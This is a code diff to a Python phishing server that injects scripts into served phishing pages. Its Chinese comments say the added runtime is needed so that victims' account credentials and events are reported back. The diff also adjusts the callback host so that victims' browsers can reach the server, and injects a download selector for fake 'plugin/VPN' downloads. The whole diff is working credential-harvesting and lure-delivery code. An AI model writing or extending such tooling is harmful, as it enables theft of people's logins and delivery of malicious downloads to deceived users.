@@ -399,9 +399,21 @@ def _make_handler(server: PhishingServer):
                                 f"page '{name}' not found")
                 return
             html = res["html"]
-            # 注入下载物列表 + UA 选择器(页面"下载插件/下载 VPN"按钮用)
+            # 注入公共运行时(SERVER/report/_q)+ 下载物列表 + UA 选择器。
+            # 顺序:运行时必须最先注入——页面里的 app.js 与下载选择器都调
+            # report(),缺这段运行时浏览器报 ReferenceError: report is not
+            # defined,账密/事件回传全丢(2026-09-15 修复)。
             dls = server._load_downloads()
-            inject = ('<script>window.__PH_DOWNLOADS__ = '
+            # 反连地址与页面 {{host}} 保持一致(cfg 已应用 host_override);
+            # 监听地址是通配符(0.0.0.0/::)时回退请求 Host 头——否则注入的
+            # SERVER 指向 0.0.0.0,受害者浏览器发不出回传。
+            host = str(cfg.host or "")
+            if not host or host in ("0.0.0.0", "::", "[::]", "*"):
+                host = (self.headers.get("Host") or "").split(":")[0] or "127.0.0.1"
+            runtime = server._builder.runtime(host=host,
+                                              port=server._config.port)
+            inject = (f"<script>{runtime}</script>\n"
+                      '<script>window.__PH_DOWNLOADS__ = '
                       f"{json.dumps(dls, ensure_ascii=False)};</script>\n"
                       f"<script>{_DL_SELECTOR_JS}</script>")
             if "</head>" in html:
